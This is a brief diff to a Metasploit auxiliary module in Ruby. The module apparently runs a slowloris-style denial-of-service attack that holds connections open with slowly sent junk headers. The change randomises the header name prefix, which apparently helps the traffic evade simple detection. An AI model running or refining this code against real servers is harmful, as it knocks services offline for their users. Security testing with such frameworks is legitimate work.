@@ -63,7 +63,7 @@ class MetasploitModule < Msf::Auxiliary
               current_sock = connect(global=false)
               current_sock.puts(header)
               headers.times do
-                data = "X-a-#{rand(0..1000)}: b\r\n"
+                data = Rex::Text.rand_text_alpha(3) + "-#{rand(0..1000)}: b\r\n"
                 current_sock.puts(data)
                 sleep rand(1..timeout)
               end
